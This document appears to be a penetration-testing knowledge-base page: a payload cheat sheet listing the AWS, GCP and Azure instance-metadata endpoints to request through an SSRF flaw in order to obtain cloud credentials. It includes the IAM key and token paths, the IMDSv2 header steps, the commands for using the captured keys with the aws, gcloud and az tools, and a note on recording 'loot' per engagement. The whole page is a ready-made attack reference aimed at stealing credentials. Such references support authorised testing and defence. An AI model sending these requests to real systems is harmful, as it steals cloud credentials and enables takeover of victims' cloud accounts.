---
title: "Payloads: Cloud Metadata (IMDS)"
type: payloads
tags: [payloads, ssrf, cloud, credentials]
sources: []
date_created: 2026-06-05
date_updated: 2026-06-05
---

# Payloads: Cloud Metadata (IMDS)

Endpoints to hit once SSRF reaches the metadata IP. Goal: cloud creds. See [[ssrf]], [[aws-metadata-ssrf]].

## AWS (169.254.169.254)
```
# IMDSv1
/latest/meta-data/iam/security-credentials/                 # -> role name
/latest/meta-data/iam/security-credentials/<role>           # -> AccessKey/Secret/Token
/latest/user-data                                           # often secrets
/latest/dynamic/instance-identity/document                  # account id, region
# IMDSv2 (token first)
PUT /latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600)
GET ... (X-aws-ec2-metadata-token: <token>)
```

## GCP (metadata.google.internal) - header Metadata-Flavor: Google
```
/computeMetadata/v1/instance/service-accounts/default/token
/computeMetadata/v1/instance/service-accounts/default/email
/computeMetadata/v1/project/project-id
?recursive=true&alt=json
```

## Azure (169.254.169.254) - header Metadata: true
```
/metadata/instance?api-version=2021-02-01
/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
/metadata/identity/oauth2/token?...&resource=https://vault.azure.net
```

## Use captured creds
```
aws: export AWS_ACCESS_KEY_ID/SECRET/SESSION_TOKEN -> aws sts get-caller-identity
gcp: gcloud auth activate / call APIs with bearer token
azure: az login --identity / call ARM with bearer
```
Record creds in `targets/<eng>/loot.md` (status unconfirmed until validated).
